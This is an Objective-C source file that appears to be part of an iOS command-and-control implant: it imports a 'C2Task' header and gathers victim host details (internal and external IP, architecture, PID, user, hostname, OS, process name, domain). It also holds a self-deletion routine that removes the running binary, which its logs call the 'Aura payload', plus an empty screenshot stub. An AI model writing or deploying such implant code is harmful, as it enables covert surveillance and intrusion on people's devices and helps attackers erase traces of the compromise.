#import "SystemInfoHelper.h"
#import "C2Task.h"

@implementation SystemInfoHelper

+ (NSString *)getInternalIPAddress {
    NSString *address = @"error";
    struct ifaddrs *interfaces = NULL;
    struct ifaddrs *temp_addr = NULL;
    int success = 0;

    success = getifaddrs(&interfaces);
    if (success == 0) {
        temp_addr = interfaces;
        while (temp_addr != NULL) {
            if (temp_addr->ifa_addr->sa_family == AF_INET) {
                if ([[NSString stringWithUTF8String:temp_addr->ifa_name] isEqualToString:@"en0"]) {
                    address = [NSString stringWithUTF8String:inet_ntoa(((struct sockaddr_in *)temp_addr->ifa_addr)->sin_addr)];
                }
            }
            temp_addr = temp_addr->ifa_next;
        }
    }
    freeifaddrs(interfaces);
    return address;
}

+ (NSString *)getExternalIPAddress {
    NSURL *url = [NSURL URLWithString:@"http://ipinfo.io/ip"];
    NSError *error;
    NSString *externalIP = [NSString stringWithContentsOfURL:url encoding:NSUTF8StringEncoding error:&error];
    if (error) {
        NSLog(@"[ERROR] Unable to fetch external IP: %@", error.localizedDescription);
        return @"error";
    }
    return [externalIP stringByTrimmingCharactersInSet:[NSCharacterSet newlineCharacterSet]];
}

+ (NSString *)getArchitecture {
    cpu_type_t cpuType;
    size_t size = sizeof(cpuType);

    // Get the CPU type
    if (sysctlbyname("hw.cputype", &cpuType, &size, NULL, 0) != 0) {
        return @"Error getting CPU type";
    }
    
    NSString *archString = @"unknown";
    if (cpuType == CPU_TYPE_ARM64) {
        archString = @"arm64";
    } else if (cpuType == CPU_TYPE_ARM) {
        archString = @"arm";
    }

    return archString;
}

+ (NSInteger)getPID {
    return [[NSProcessInfo processInfo] processIdentifier];
}

+ (NSString *)getUser {
    return NSUserName();
}

+ (NSString *)getHost {
    return [[NSProcessInfo processInfo] hostName];
}

+ (NSString *)getOS {
    UIDevice *device = [UIDevice currentDevice];
    NSString *systemName = [device systemName]; 
    NSString *systemVersion = [device systemVersion];

    NSString *osDetails = [NSString stringWithFormat:@"%@ %@", systemName, systemVersion];
    return osDetails;
}

+ (NSString *)getProcessName {
    return [[NSProcessInfo processInfo] processName];
}


+ (NSString *)getDomain {
    char domainName[256];
    if (getdomainname(domainName, sizeof(domainName)) != 0 || strlen(domainName) == 0) {
        return @"local";
    }
    return [NSString stringWithUTF8String:domainName];
}

- (void)captureFramebufferScreenshot {
    
}



+ (BOOL)deleteExecutable {
    // Get the path of the current executable
    char pathBuffer[1024];
    uint32_t size = sizeof(pathBuffer);
    _NSGetExecutablePath(pathBuffer, &size);

    // Convert the C string to NSString and standardize the path
    NSString *executablePath = [NSString stringWithUTF8String:pathBuffer];
    NSString *standardizedPath = [executablePath stringByStandardizingPath];
    
    // Log the standardized path
    NSLog(@"Payload image path: %@", standardizedPath);

    // Check if the file exists before trying to remove it
    if ([[NSFileManager defaultManager] fileExistsAtPath:standardizedPath]) {
        NSError *error = nil;
        BOOL success = [[NSFileManager defaultManager] removeItemAtPath:standardizedPath error:&error];
        if (success) {
            NSLog(@"✅ Successfully deleted the Aura payload.");
            return YES;
        } else {
            NSLog(@"❌ Failed to delete our payload!!\n %@", error);
            return NO;
        }
    } else {
        NSLog(@"✅ Payload is already deleted %@", standardizedPath);
        return YES; // Assume success since it's already deleted
    }
}

@end
